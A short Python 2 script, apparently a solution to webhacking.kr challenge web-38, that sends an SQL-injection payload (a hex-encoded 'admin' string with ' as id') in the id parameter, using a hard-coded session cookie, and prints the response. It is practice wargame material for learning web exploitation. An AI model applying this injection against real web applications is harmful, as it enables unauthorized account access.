#-*- coding: utf-8 -*-
import urllib2
import CookieManager

parameter = "?id=0x61646d696e%20as%20id"
challengeUrl = "http://webhacking.kr/challenge/web/web-38/index.php"
CookieManager.addCookie("PHPSESSID", "eabcdebaaabceddaabeabddefcabcdbe")
httpRequest = urllib2.Request(challengeUrl+parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
